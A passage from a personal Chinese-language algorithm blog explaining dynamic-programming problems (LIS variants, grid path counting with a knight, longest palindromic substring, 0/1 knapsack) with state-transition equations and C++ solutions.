<h5 id="拓1：合唱队形"><a href="#拓1：合唱队形" class="headerlink" title="拓1：合唱队形"></a>拓1：合唱队形</h5><p><img src="/project/2020/10/27/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/%E5%90%88%E5%94%B1%E9%98%9F%E5%BD%A2.jpg" alt="合唱队形"></p>
<p><strong>解法：</strong>此题就是求最长的山形队列，采用两个方向LIS的方法，枚举每个人站在中间时的最优解即可。使用两个dp数组存入从左到右和从右到左的以i结尾的LIS长度信息，此时dp1[i]+dp2[i]-1即是最长的山形队列长度。</p>
<p><strong>代码：</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">int</span> A[maxn], dp1[maxn],dp2[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)<span class="comment">//存入A[i]，从1开始</span></span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;A[i]);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)<span class="comment">//正向升序序列</span></span><br><span class="line">	&#123;</span><br><span class="line">		dp1[i] = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; i; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (A[j] &lt; A[i])</span><br><span class="line">			&#123;</span><br><span class="line">				dp1[i] = <span class="built_in">max</span>(dp1[i], dp1[j] + <span class="number">1</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = n; i &gt;= <span class="number">1</span>; i--)<span class="comment">//反向升序序列</span></span><br><span class="line">	&#123;</span><br><span class="line">		dp2[i] = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = n; j &gt; i; j--)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (A[j] &lt; A[i])</span><br><span class="line">			&#123;</span><br><span class="line">				dp2[i] = <span class="built_in">max</span>(dp2[i], dp2[j] + <span class="number">1</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> ans = <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		ans = <span class="built_in">max</span>(ans, dp1[i] + dp2[i] - <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, n-ans);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="拓2：低价购买"><a href="#拓2：低价购买" class="headerlink" title="拓2：低价购买"></a>拓2：低价购买</h5><p><img src="/project/2020/10/27/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/%E4%BD%8E%E4%BB%B7%E8%B4%AD%E4%B9%B0.jpg" alt="低价购买"></p>
<p><strong>解法：</strong>此题主要是要求LIS的数目，采用另一个数组f来记录LIS方案数。其中倘若 <code>a[i] = a[j] &amp;&amp; dp[i] = dp[j]</code> 则意味着以i结尾的LIS和以j结尾的LIS相同，此时其中一个LIS不计入方案（<u>两个相同取一个即可</u>）；若 <code>a[i] &lt; a[j] &amp;&amp; dp[i] = dp[j] + 1</code> 则意味着以i结尾的LIS可以由以j结尾的LIS转移过来，此时的方案数等于f[j] + f[i]。（<u>解释：如果有j1和j2，他们的LIS长度相同并且都等于dp[i]-1，意味着i可以由j1转移过来，也可以由j2转移过来</u><u>，则到达i的方案数为j1的方案数+j2的方案数</u>）边界条件：LIS长为1，此时方案数为1；其他情况方案数初始化为0.</p>
<p><strong>代码：</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">int</span> A[maxn], dp[maxn],f[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)<span class="comment">//存入A[i]，从1开始</span></span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;A[i]);</span><br><span class="line">	<span class="keyword">int</span> maxx = <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= n; i++)<span class="comment">//LIS</span></span><br><span class="line">	&#123;</span><br><span class="line">		dp[i] = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (A[i] &lt; A[j])</span><br><span class="line">			&#123;</span><br><span class="line">				dp[i] = <span class="built_in">max</span>(dp[i], dp[j] + <span class="number">1</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		maxx = <span class="built_in">max</span>(maxx, dp[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (dp[i] == <span class="number">1</span>)f[i] = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; i; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (dp[i] == dp[j] &amp;&amp; A[i] == A[j])</span><br><span class="line">				f[j] = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">if</span> (dp[i] == dp[j] + <span class="number">1</span> &amp;&amp; A[i] &lt; A[j])</span><br><span class="line">				f[i] += f[j];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (dp[i] == maxx)</span><br><span class="line">			ans += f[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, maxx, ans);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="二维动态规划"><a href="#二维动态规划" class="headerlink" title="二维动态规划"></a>二维动态规划</h3><hr>
<h4 id="1-马拦过河卒"><a href="#1-马拦过河卒" class="headerlink" title="1.马拦过河卒"></a>1.马拦过河卒</h4><p><img src="/project/2020/10/27/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/%E8%BF%87%E6%B2%B3%E5%8D%92.jpg" alt="过河卒"></p>
<p><strong>解法：</strong>此题用二维数组dp记录每个坐标的路径条数，则$dp[n][m]$即所求。</p>
<p>状态转移方程：$dp[x][y] = dp[x-1][y] + dp[x][y-1]$.边界值：$dp[0][y] = 1$和$dp[x][0] = 1$.即坐标轴上的值路径均为1.需要注意的是，倘若马的控制点在坐标轴上，则该点及其后的点均不可达（路径数为0）</p>
<p><strong>代码：</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> horse[<span class="number">21</span>][<span class="number">21</span>];</span><br><span class="line"><span class="keyword">int</span> stepx[<span class="number">8</span>] = &#123; <span class="number">-2</span>,<span class="number">-2</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> stepy[<span class="number">8</span>] = &#123; <span class="number">-1</span>,<span class="number">1</span>,<span class="number">-2</span>,<span class="number">2</span>,<span class="number">-2</span>,<span class="number">2</span>,<span class="number">-1</span>,<span class="number">1</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">21</span>][<span class="number">21</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> m, n, X, Y;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d%d&quot;</span>, &amp;n, &amp;m, &amp;X, &amp;Y);</span><br><span class="line">	horse[X][Y] = <span class="literal">true</span>;<span class="comment">//马所在位置也被控制</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)<span class="comment">//初始化马的控制点，采用二维数组记录棋盘，被马控制则为true</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> x = X + stepx[i];</span><br><span class="line">		<span class="keyword">int</span> y = Y + stepy[i];</span><br><span class="line">		<span class="keyword">if</span> (x &gt;= <span class="number">0</span> &amp;&amp; x &lt;= n &amp;&amp; y &gt;= <span class="number">0</span> &amp;&amp; y &lt;= m)</span><br><span class="line">			horse[x][y] = <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= m; i++)<span class="comment">//y状态初值,注意马的影响</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (!horse[<span class="number">0</span>][i])</span><br><span class="line">			dp[<span class="number">0</span>][i] = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">break</span>;<span class="comment">//注意，倘若坐标轴上有一点不可达，则其后的点都不可达</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= n; i++)<span class="comment">//x状态初值,注意马的影响</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (!horse[i][<span class="number">0</span>])</span><br><span class="line">			dp[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">break</span>;<span class="comment">//注意，倘若坐标轴上有一点不可达，则其后的点都不可达</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)<span class="comment">//二维数组状态转移</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= m; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(!horse[i][j])</span><br><span class="line">				dp[i][j] = dp[i - <span class="number">1</span>][j] + dp[i][j - <span class="number">1</span>];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, dp[n][m]);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="2-最长回文串"><a href="#2-最长回文串" class="headerlink" title="2.最长回文串"></a>2.最长回文串</h4><p><img src="/project/2020/10/27/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E4%B8%B2.jpg" alt="最长回文串"></p>
<p><strong>解法：</strong>以$dp[i][j]$表示A[i]到A[j]的子串是不是回文串，若是则置其值为1，不是则置为0.那么求$dp[i][j]$的值有两种情形：1.A[i] != A[j]则$dp[i][j]$必为0。2.A[i] == A[j]则$dp[i][j]$是否是回文串取决于$dp[i+1][j-1]$是否是回文串。</p>
<p><u>状态转移方程如下</u>：<br>$$<br>dp[i][j] =<br>\left{<br>             \begin{array}{<strong>lr</strong>}<br>             dp[i+1][j-1]&amp;,A[i] = A[j]  \<br>            0&amp;, A[i] != A[j]<br>             \end{array}<br>\right.<br>$$<br><u>边界条件为</u>：1.长度为1的子串dp值均为1（都是回文串）2.长度为2的子串根据两个字母值是否相等来确定dp的值。即为：$dp[i][i] = 1 ,dp[i][i+1] = (A[i] == A[i+1]) ? 1 : 0$</p>
<p>以下分析如何求dp数组：倘若按照i，j按顺序遍历来求解，例如固定i=1，j从1开始遍历，当开始计算$dp[1][3]$时，我们需要$dp[2][2]$的值，而此时i=1，$dp[2][2]$的值还未知。事实上，以任何顺序遍历求解都无法保证完成。所以我们按照<u>长度和子串首位遍历</u>求解，从长度为3的子串开始，枚举子串的起始位置（i处）。</p>
<p>此算法复杂度为$O(n^2)$</p>
<p><strong>代码：</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1010</span>;</span><br><span class="line"><span class="keyword">char</span> A[maxn];</span><br><span class="line"><span class="keyword">int</span> dp[maxn][maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">gets</span>(A);</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(A),ans = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(dp));<span class="comment">//string.h中的内存赋值函数，其中各个参数分别为：内存指针，要赋的值，填充的字节数。此行功能为将dp数组赋值为0.</span></span><br><span class="line">    <span class="comment">//设置边界</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        dp[i][i] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(i &lt; len)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(A[i] == A[i+<span class="number">1</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                dp[i][i+<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">                ans = <span class="number">2</span>;<span class="comment">//注意更新当前最长回文串长度</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//状态转移方程</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> l = <span class="number">3</span>; l &lt;= len; l++)<span class="comment">//枚举字串长度</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i + l - <span class="number">1</span> &lt; len; i++)<span class="comment">//枚举子串起始位置</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> j = i + l - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(A[i] == A[j] &amp;&amp; dp[i+<span class="number">1</span>][j<span class="number">-1</span>] == <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                dp[i][j] = <span class="number">1</span>;</span><br><span class="line">                ans = l;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-背包问题"><a href="#3-背包问题" class="headerlink" title="3.背包问题"></a>3.背包问题</h4><h5 id="01背包"><a href="#01背包" class="headerlink" title="01背包"></a>01背包</h5><p><img src="/project/2020/10/27/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/01%E8%83%8C%E5%8C%85.jpg" alt="01背包"></p>
<p><strong>解法：</strong>此题采用动态规划方法，将n件物品编号，拿到第i件物品时最大的总价值dp[i]取决于拿第i-1件物品时的最大总价值。当拿到第i件物品时背包容量不够，则dp[i] = dp[i-1]；当拿到第i件物品时背包容量足够容纳该物品，则可以选择拿dp[i] = dp[i-1]+c[i]或者不拿dp[i] = dp[i-1]。我们除了记录i之外，还需要一维来记录数组容量，倘若只有i物品的选取与否来决定最大价值显然会变成贪心算法，而贪心算法无法求出最优解。当我们可以选取物品i时（v&gt;w[i]），就去考虑小背包的最大价值。最后遍历第n件物品的v（0~V），最大值即所求。（并没有要求背包装满）</p>
<p><u>状态转移方程如下</u>:$dp[i][v] = max(dp[i-1][v],dp[i-1][v-w[i]] + c[i]) (1 \leq i \leq n , w[i] \leq v \leq V)$</p>
<p><u>边界条件</u>：$dp[0][v] = 0 (0 \leq v \leq V)$ 即前0件物品放入任何容量的背包中都只能获得价值0.</p>
<p>此解法复杂度为$O(nV)$.</p>
<p><strong>空间优化：</strong>如下图，我们可以看出，在动态转移过程中，对每个i的求解都只需要i-1的状态值（即上一行），若用整个二维数组记录所有的值显得有些浪费。实际上我们可以只用一个一维数组，仅保留求解时需要的值，求解完毕则可以丢弃（留给其他的用）该块空间，称为<u>滚动数组</u>。</p>
<p>假设i=1，则图中第一行的值全为0，第二行的值根据第一行来确定，如图所示。在优化的解法中，我们仅有一行来保存数据，在初始化时将它设置为全零。我们计算第i行的数据时（即图中第二行），在对每一个v的计算中，需要参考当前块的值和v-w[i]块的值，而在更新数组之前这两块的值都是上一次的，即i-1行的，正是我们所需要的；在更新之后当前的块则是第i行的了，供给i+1行使用。</p>
<p>根据上面的描述我们不难发现，必须从后往前更新数组才可以。因为倘若从前往后更新，则数组左边是已经更新（第i行）的数据，右边是更新前（第i-1行）的数据，而在往右更新时，我们需要左边上一行的数据来比较大小，此时左边上一行的数据已经被覆盖掉了。</p>
<p><u>优化后的状态转移方程</u>：$dp[v] = max(dp[v], dp[v - w[i]] + c[i]) (1 \leq i \leq n, w[i] \leq v \leq V)$</p>
<p><img src="/project/2020/10/27/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/01%E8%83%8C%E5%8C%85%E7%A4%BA%E6%84%8F%E5%9B%BE.jpg" alt="01背包示意图"></p>
<p><strong>代码：</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">100</span>;<span class="comment">//物品最大件数</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxv = <span class="number">1000</span>;<span class="comment">//V最大上限</span></span><br><span class="line"><span class="keyword">int</span> w[maxn],c[maxn],dp[maxv];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,V;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;V);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)<span class="comment">//下标从i开始</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;w[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;c[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//边界</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> v = <span class="number">0</span>; v &lt;= V; v++)<span class="comment">//背包容量有可能为0</span></span><br><span class="line">    &#123;</span><br><span class="line">        dp[v] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//状态转移方程</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> v = V; v &gt;= w[i]; v--)<span class="comment">//当v&lt;w[i]时dp值就是本身，所以不做处理</span></span><br><span class="line">        &#123;</span><br><span class="line">            dp[v] = <span class="built_in">max</span>(dp[v], dp[v-w[i]] + c[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//求最大值</span></span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> v = <span class="number">0</span>; v &lt;= V; v++)</span><br><span class="line">    &#123;</span><br><span class="line">        ans = <span class="built_in">max</span>(ans, dp[v]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://imane219.github.io/project/2020/10/20/STL/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/project/images/avatar.gif">
      <meta itemprop="name" content="Imane">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Imane's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/project/2020/10/20/STL/" class="post-title-link" itemprop="url">STL</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-10-20 11:10:24" itemprop="dateCreated datePublished" datetime="2020-10-20T11:10:24+08:00">2020-10-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-05-17 16:04:14" itemprop="dateModified" datetime="2021-05-17T16:04:14+08:00">2021-05-17</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/project/categories/%E7%AE%97%E6%B3%95/" itemprop="url" rel="index"><span itemprop="name">算法</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
